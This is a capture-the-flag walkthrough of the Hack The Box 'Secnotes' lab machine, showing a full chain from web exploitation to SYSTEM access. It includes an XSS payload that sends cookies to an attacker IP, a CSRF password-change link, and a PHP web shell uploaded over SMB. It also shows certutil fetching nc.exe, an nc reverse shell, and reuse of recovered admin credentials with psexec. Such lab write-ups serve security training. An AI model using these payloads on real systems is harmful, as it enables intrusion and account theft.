### Secnotes HTB

### Difficulty = Easy

### IP Address = 10.10.10.97

Nmap Scan: 

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ nmap -sCV -A 10.10.10.97 -p80,445 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 23:45 WAT
Nmap scan report for 10.10.10.97
Host is up (0.24s latency).

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-01-28T14:45:38-08:00
|_clock-skew: mean: 2h40m03s, deviation: 4h37m13s, median: 0s
| smb2-time: 
|   date: 2023-01-28T22:45:36
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.23 seconds
```

Checking smb we see it doesn't allow anonymous listing of share

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ smbclient -L 10.10.10.97                                   
Password for [WORKGROUP\mark]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

Lets move on to the web server on port 80
![image](https://user-images.githubusercontent.com/113513376/215294609-6a565c38-43d7-4072-b56e-becae59392c4.png)

Gives a login page and a register function 

I'll register and login to see what i can do
![image](https://user-images.githubusercontent.com/113513376/215294647-89d5b38f-0e33-41fe-abe6-dbbc06d47528.png)

Now i'll login using `hacker:hacker`
![image](https://user-images.githubusercontent.com/113513376/215294667-08711860-5fd3-48e1-b1c4-a3386a02fbcf.png)

We see an email lets save it for maybe future use

```
Email: tyler@secnotes.htb
```

I'll try creating a note and injecting html tags
![image](https://user-images.githubusercontent.com/113513376/215294730-f394997e-7c91-4097-a2f5-be7b83d22728.png)

Well it worked
![image](https://user-images.githubusercontent.com/113513376/215294746-7706eb10-cf5b-4315-8a22-a630c618fa87.png)

I'll confirm using this payload 

```
Payload: <img src=x onerror=this.src='http://10.10.16.7/?'+document.cookie;>
```

And back on the netcat listener we see a http request

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ nc -lvnp 80      
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.16.7] 33290
GET /?PHPSESSID=9dmr8dhm51q95gju254htu5g3c HTTP/1.1
Host: 10.10.16.7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.97/
```

So that works. Lets check out other functions as we can't leverage this vulnerability yet

We have a password reset option
![image](https://user-images.githubusercontent.com/113513376/215295115-86167caf-f472-4ca4-910f-485d4408147a.png)

And it doesn't request for the current password
![image](https://user-images.githubusercontent.com/113513376/215295122-f2b4ce73-cdff-498f-8ffd-7d43148d06d6.png)

```
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/change_pass.php
Cookie: PHPSESSID=9dmr8dhm51q95gju254htu5g3c
Upgrade-Insecure-Requests: 1

password=hackme&confirm_password=hackme&submit=submit
```

It redirects to the home page
![image](https://user-images.githubusercontent.com/113513376/215295156-9f122636-8e6e-4219-a839-0d8a3976f5f0.png)

And also lets try if we can do password reset using GET http method

```
Payload: http://10.10.10.97/change_pass.php?password=plshackme&confirm_password=plshackme&submit=submit
```

It worked
![image](https://user-images.githubusercontent.com/113513376/215295213-4e4bcb1d-f08a-4f82-b653-825e5e4c27c5.png)

Lets keep on checking other functions

We see there's a contact me function
![image](https://user-images.githubusercontent.com/113513376/215295236-a67f631f-4366-4094-840f-8b6e8e18d84f.png)

And it requires a message to be sent

I'll try sending my ip

```
Payload: http://10.10.16.7/
```

And back on the netcat listener we get a connection back

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.97] 50946
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.16.7
Connection: Keep-Alive
```

So i'll try performing a cross site request forgery attack CSRF

```
Payload:
http://10.10.10.97/change_pass.php?password=plshackme&confirm_password=plshackme&submit=submit
http://10.10.16.7/reset

``` 

I'll a netcat listner on port 80 and send the payload as the message in hopes that it will reset the user `tyler` password to `plshackme`

On sending it boom we get a callback

Why i made the server send a connection back to me is to know if it worked

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.97] 51080
GET /reset HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.16.7
Connection: Keep-Alive
```

Now lets try loggin as `tyler:plshackme`

And it worked
![image](https://user-images.githubusercontent.com/113513376/215295437-7c0e0570-19c6-4ab8-bc2c-f54bc3d99690.png)


On checking the notes we see a credential for smb `\\secnotes.htb\new-site tyler / 92g!mA8BGjOirkL%OG*&`
![image](https://user-images.githubusercontent.com/113513376/215295490-eca2f0e6-5cc3-4a40-aa52-ac00b03d6613.png)

Now lets try the credential over smb `tyler:92g!mA8BGjOirkL%OG*&`

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ smbclient -L 10.10.10.97 -U tyler
Password for [WORKGROUP\tyler]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        new-site        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.97 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

Now i'll connect to the `new-site` share

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ smbclient //10.10.10.97/new-site -U tyler
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Aug 19 19:06:14 2018
  ..                                  D        0  Sun Aug 19 19:06:14 2018
  iisstart.htm                        A      696  Thu Jun 21 16:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 16:26:03 2018

                7736063 blocks of size 4096. 3394220 blocks available
smb: \> 
```

We see it looks like the web root of a web server 

I'll rescan the target to see if any port is open

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]                                                                                                                                                                     
└─$ rustscan -a 10.10.10.97 -- -sCV                                                                                                                                                                               
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                                                                                          
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                                                                                                                          
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                                                                                                                                                          
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                                                                                          
The Modern Day Port Scanner.                                                                                                                                                                                      
________________________________________                                                                                                                                                                          
: https://discord.gg/GFrQsGy           :                                                                                                                                                                          
: https://github.com/RustScan/RustScan :                                                                                                                                                                          
 --------------------------------------                                                                                                                                                                           
__HACK THE PLANET__                                                                                                                                                                                               
                                                                                                                                                                                                                  
[~] The config file is expected to be at "/home/mark/.rustscan.toml"                                                                                                                                              
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers                                                                                               
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.                                                                        
Open 10.10.10.97:80                                                                                                                                                                                               
Open 10.10.10.97:445                                                                                                                                                                                              
Open 10.10.10.97:8808                                                                                                                                                                                             
[~] Starting Script(s)                                                                                                                                                                                            
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                                                                                         
                                                                                                                                                                                                                  
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-29 00:24 WAT                                                                                                                                               
PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds syn-ack Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h40m01s, deviation: 4h37m10s, median: 0s
| smb2-time: 
|   date: 2023-01-28T23:25:01
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25086/tcp): CLEAN (Timeout)
|   Check 2 (port 42839/tcp): CLEAN (Timeout)
|   Check 3 (port 53444/udp): CLEAN (Timeout)
|   Check 4 (port 45342/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-01-28T15:25:04-08:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
```

Nice we have another web server on port 8808

And it shows just the default IIS page
![image](https://user-images.githubusercontent.com/113513376/215295702-3b1a9b32-62d1-4ade-bac3-a9a21ede2371.png)

Seems like we will need to upload a shell to to web server via the smb

The web server uses php language 
![image](https://user-images.githubusercontent.com/113513376/215295987-2f519aa7-ad95-481f-8d99-2aa1828cca03.png)

And i'll use this 

```
Payload: <?php system($_GET['cmd']); ?>

```

Now lets upload it to the smb server

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ smbclient //10.10.10.97/new-site -U tyler
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (1.7 kb/s) (average 1.7 kb/s)
smb: \>
```

Now on the web server we can execute it
![image](https://user-images.githubusercontent.com/113513376/215296343-fb050b2a-668b-43d9-9f91-56679681c5f1.png)

Now lets get a reverse shell 

```
Payload: http://10.10.10.97:8808/shell.php?cmd=certutil.exe%20-urlcache%20-f%20http://10.10.16.7:8081/nc.exe%20nc.exe
Payload: http://10.10.10.97:8808/shell.php?cmd=nc.exe%2010.10.16.7%2080%20-e%20cmd
```

Back on the netcat listener

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.97] 50359
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>
```

Now lets escalate privilege

The user's desktop contains a bash.lnk file which is basically a shortcut to `bash`

```
C:\Users\tyler\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Users\tyler\Desktop

08/19/2018  02:51 PM    <DIR>          .
08/19/2018  02:51 PM    <DIR>          ..
06/22/2018  02:09 AM             1,293 bash.lnk
08/02/2021  02:32 AM             1,210 Command Prompt.lnk
04/11/2018  03:34 PM               407 File Explorer.lnk
06/21/2018  04:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  08:17 AM             1,110 Notepad++.lnk
01/28/2023  03:46 PM                34 user.txt
08/19/2018  09:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,965 bytes
               2 Dir(s)  13,909,172,224 bytes free

C:\Users\tyler\Desktop>
```

This is interesting cause we're on a windows box not linux so maybe this device runs like a linux termninal also

And I confirmed it by checking `C:\distros\ubuntu`

```
c:\Distros\Ubuntu>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of c:\Distros\Ubuntu

06/21/2018  04:59 PM    <DIR>          .
06/21/2018  04:59 PM    <DIR>          ..
07/11/2017  05:10 PM           190,434 AppxBlockMap.xml
07/11/2017  05:10 PM             2,475 AppxManifest.xml
06/21/2018  02:07 PM    <DIR>          AppxMetadata
07/11/2017  05:11 PM            10,554 AppxSignature.p7x
06/21/2018  02:07 PM    <DIR>          Assets
06/21/2018  02:07 PM    <DIR>          images
07/11/2017  05:10 PM       201,254,783 install.tar.gz
07/11/2017  05:10 PM             4,840 resources.pri
06/21/2018  04:51 PM    <DIR>          temp
07/11/2017  05:10 PM           222,208 ubuntu.exe
07/11/2017  05:10 PM               809 [Content_Types].xml
               7 File(s)    201,686,103 bytes
               6 Dir(s)  13,909,172,224 bytes free

c:\Distros\Ubuntu>
```

So with this we know we can run bash 

I'll search for where the executable path is using `where` command

```
c:\Distros\Ubuntu>where /R C:\ "bash.exe"
where /R C:\ "bash.exe"
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

Now let run it

```
c:\Distros\Ubuntu>C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
id
uid=0(root) gid=0(root) groups=0(root)
```

We can now stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
root@SECNOTES:~# export TERM=xterm
export TERM=xterm
root@SECNOTES:~# cd /root
cd /root
root@SECNOTES:~# ls -al
ls -al
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
root@SECNOTES:~#
```

We have a `.bash_history` file lets check the content

```
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exitroot@SECNOTES:~# 
```

We see the user tried connecting to smb as administrator 

Lets check it out from our host using `crackmapexec` xD

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ crackmapexec smb 10.10.10.97 -u Administrator -p 'u6!4ZwgwOM#^OBf#Nwnh' 
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\Administrator:u6!4ZwgwOM#^OBf#Nwnh (Pwn3d!)
```

Nice since we know the user connected to the `C$` share meaning the filesystem 

We can then use `psexec` to get a shell as `nt/authority`

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Secnotes]
└─$ impacket-psexec administrator@10.10.10.97
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file knFcdmMl.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service YnJx on 10.10.10.97.....
[*] Starting service YnJx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system

C:\WINDOWS\system32>
```

And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>

                          
                         










